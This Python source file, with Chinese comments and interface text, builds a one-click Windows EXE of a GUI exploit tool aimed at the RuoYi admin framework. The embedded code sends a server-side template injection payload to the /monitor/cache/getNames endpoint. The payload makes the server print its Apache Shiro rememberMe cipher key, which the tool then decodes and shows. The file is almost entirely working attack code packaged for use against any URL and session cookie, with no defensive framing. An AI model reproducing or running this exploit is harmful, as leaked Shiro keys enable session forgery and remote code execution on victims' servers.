import os
import sys
import shutil
import subprocess
import tkinter as tk
from tkinter import messagebox, filedialog

# 目标EXE的核心代码（保持不变）
CORE_CODE = '''
import base64
import requests
import tkinter as tk
from tkinter import ttk, messagebox
from tkinter import font as tkFont
import threading

def bytes_to_base64(byte_array):
    if isinstance(byte_array, bytearray):
        byte_array = bytes(byte_array)
    base64_encoded_bytes = base64.b64encode(byte_array)
    return base64_encoded_bytes.decode('utf-8')

def int_list_to_bytes(int_list):
    normalized_list = [x & 0xFF for x in int_list]
    return bytes(normalized_list)

def get_shiro_key(url, cookie):
    if not url:
        return "❌ 错误：URL不能为空！"

    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    inject_payload = "__|$${{#response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}}|__::.x"
    raw_data = f"fragment={inject_payload}"

    headers = {
        "User-Agent": "python-requests/2.32.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        response = requests.post(
            url.rstrip('/') + '/monitor/cache/getNames',
            data=raw_data,
            headers=headers,
            timeout=10,
            allow_redirects=False,
            verify=False,
            stream=False
        )

        result = f"📌 响应状态码：{response.status_code}\\n"
        response.encoding = 'ISO-8859-1'
        shiro_key_data = response.text.strip()

        if shiro_key_data and len(shiro_key_data) > 0 and '=' in shiro_key_data:
            result += f"成功获取Shiro密钥：\\n{shiro_key_data}"
        elif 'shirokey' in [k.lower() for k in response.headers.keys()]:
            for k, v in response.headers.items():
                if k.lower() == 'shirokey':
                    try:
                        key_arr = [int(x) for x in v.split(',')]
                        key = bytes_to_base64(int_list_to_bytes(key_arr))
                        result += f"✅ 成功获取Shiro密钥：\\n{key}"
                    except:
                        result += f"✅ 成功获取Shiro密钥：\\n{v.strip()}"
                    break
        else:
            result += f"❌ 未检测到Shiro密钥\\n响应内容：{shiro_key_data[:200]}..."

        return result

    except requests.exceptions.Timeout:
        return "❌ 错误：请求超时（目标IP/端口不可达）"
    except requests.exceptions.ConnectionError as e:
        return f"❌ 连接失败：\\n{str(e)}\\n\\n排查建议：\\n1. 检查URL格式\\n3. 关闭本地防火墙/代理"
    except requests.exceptions.SSLError:
        return "❌ 错误：HTTPS证书验证失败（改用HTTP协议）"
    except Exception as e:
        return f"❌ 未知错误：\\n{str(e)}"

def start_scan(gui_obj):
    def scan_task():
        url = gui_obj.url_entry.get().strip()
        cookie = gui_obj.cookie_entry.get().strip()
        gui_obj.scan_btn.config(state=tk.DISABLED)
        gui_obj.result_text.delete(1.0, tk.END)
        gui_obj.result_text.insert(tk.END, "🔍 正在发送请求...\\n")

        result = get_shiro_key(url, cookie)

        gui_obj.result_text.delete(1.0, tk.END)
        gui_obj.result_text.insert(tk.END, result + "\\n")
        gui_obj.scan_btn.config(state=tk.NORMAL)

    threading.Thread(target=scan_task, daemon=True).start()

class ShiroKeyGUI:
    def __init__(self, root):
        self.root = root
        root.title("Shiro密钥提取工具（by:mrykz）")
        root.geometry("680x480")
        root.resizable(False, False)

        self.canvas = tk.Canvas(root, bg="#f0f0f0", highlightthickness=0)
        self.canvas.pack(fill=tk.BOTH, expand=True)
        self.draw_gradient("#2196F3", "#4CAF50")

        title_font = tkFont.Font(family="Segoe UI", size=14, weight="bold")
        title_label = ttk.Label(root, text="Shiro密钥提取工具（RuoYi SSTI）", font=title_font, background="#E2EAF4")
        title_label.place(relx=0.5, rely=0.1, anchor=tk.CENTER)

        url_frame = ttk.Frame(root)
        url_frame.place(relx=0.5, rely=0.25, anchor=tk.CENTER, width=620)
        ttk.Label(url_frame, text="目标URL：", font=("Segoe UI", 10), background="#E2EAF4").pack(anchor=tk.W, padx=5)
        self.url_entry = ttk.Entry(url_frame, width=78, font=("Consolas", 9))
        self.url_entry.pack(fill=tk.X, padx=5, pady=5)
        self.url_entry.insert(0, "http://")

        cookie_frame = ttk.Frame(root)
        cookie_frame.place(relx=0.5, rely=0.4, anchor=tk.CENTER, width=620)
        ttk.Label(cookie_frame, text="Cookie：", font=("Segoe UI", 10), background="#E2EAF4").pack(anchor=tk.W, padx=5)
        self.cookie_entry = ttk.Entry(cookie_frame, width=78, font=("Consolas", 9))
        self.cookie_entry.pack(fill=tk.X, padx=5, pady=5)
        self.cookie_entry.insert(0, "JSESSIONID=")

        self.scan_btn = ttk.Button(
            root,
            text="🚀 一键提取Shiro密钥",
            command=lambda: start_scan(self),
            style="TButton"
        )
        self.scan_btn.place(relx=0.5, rely=0.55, anchor=tk.CENTER, width=220, height=40)

        result_frame = ttk.LabelFrame(root, text="📝 结果输出", padding=10)
        result_frame.place(relx=0.5, rely=0.75, anchor=tk.CENTER, width=620, height=140)
        self.result_text = tk.Text(result_frame, width=75, height=6, font=("Consolas", 10), wrap=tk.WORD)
        scrollbar = ttk.Scrollbar(result_frame, orient=tk.VERTICAL, command=self.result_text.yview)
        self.result_text.configure(yscrollcommand=scrollbar.set)
        self.result_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        init_tips = """✅ 请填写URL和Cookie后提取密钥！
"""
        self.result_text.insert(1.0, init_tips)

    def draw_gradient(self, color1, color2):
        for i in range(480):
            ratio = i / 480
            r1, g1, b1 = int(color1[1:3], 16), int(color1[3:5], 16), int(color1[5:7], 16)
            r2, g2, b2 = int(color2[1:3], 16), int(color2[3:5], 16), int(color2[5:7], 16)
            r = int(r1 + (r2 - r1) * ratio)
            g = int(g1 + (g2 - g1) * ratio)
            b = int(b1 + (b2 - b1) * ratio)
            self.canvas.create_line(0, i, 680, i, fill=f"#{r:02x}{g:02x}{b:02x}")

if __name__ == "__main__":
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.shcore.SetProcessDpiAwareness(1)
    root = tk.Tk()
    app = ShiroKeyGUI(root)
    root.mainloop()
'''


def select_icon():
    """选择图标文件"""
    icon_path = filedialog.askopenfilename(
        title="选择图标文件（.ico格式）",
        filetypes=[("图标文件", "*.ico"), ("所有文件", "*.*")]
    )
    return icon_path


def auto_build_exe(icon_path=None):
    """自动生成目标EXE（支持自定义图标）"""
    temp_py = "shiro_core.py"
    with open(temp_py, "w", encoding="utf-8") as f:
        f.write(CORE_CODE)

    def install_package(pkg):
        subprocess.run(
            [sys.executable, "-m", "pip", "install", pkg, "-i", "https://pypi.tuna.tsinghua.edu.cn/simple"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

    try:
        import PyInstaller
    except ImportError:
        print("📥 正在安装pyinstaller依赖...")
        install_package("pyinstaller")

    try:
        import requests
    except ImportError:
        print("📥 正在安装requests依赖...")
        install_package("requests")

    exe_name = "ShiroKeyTool.exe"
    build_cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--windowed",
        "--name", exe_name,
        "--distpath", ".",
        "--workpath", "temp_build",
        "--specpath", "temp_build",
        "--clean",
        "--noupx",
    ]

    # 🔥 添加图标参数
    if icon_path and os.path.exists(icon_path):
        build_cmd.extend(["--icon", icon_path])
        print(f"✅ 使用自定义图标：{icon_path}")
    else:
        print("⚠️ 未选择图标，使用默认图标")

    build_cmd.append(temp_py)

    try:
        build_result = subprocess.run(
            build_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            encoding="utf-8"
        )

        if build_result.returncode == 0 and os.path.exists(exe_name):
            shutil.rmtree("temp_build", ignore_errors=True)
            os.remove(temp_py) if os.path.exists(temp_py) else None
            os.remove(f"{exe_name}.spec") if os.path.exists(f"{exe_name}.spec") else None

            success_msg = f"✅ EXE生成成功！\n文件路径：{os.path.abspath(exe_name)}\n\n双击该文件即可：\n1. 填写URL和Cookie\n2. 一键提取Shiro密钥"
            print(success_msg)
            messagebox.showinfo("生成成功", success_msg)
        else:
            error_msg = build_result.stderr if build_result.stderr else "未知打包错误"
            raise Exception(error_msg)

    except Exception as e:
        error_info = f"❌ 生成EXE失败：\n{str(e)}"
        print(error_info)
        messagebox.showerror("打包失败", error_info)
    finally:
        shutil.rmtree("temp_build", ignore_errors=True)
        if os.path.exists(temp_py):
            os.remove(temp_py)


if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()

    # 🔥 弹窗询问是否添加图标
    if messagebox.askyesno("添加图标", "是否为EXE添加自定义图标？"):
        icon_file = select_icon()
        if icon_file:
            auto_build_exe(icon_path=icon_file)
        else:
            messagebox.showwarning("未选择", "未选择图标文件，使用默认图标")
            auto_build_exe()
    else:
        auto_build_exe()
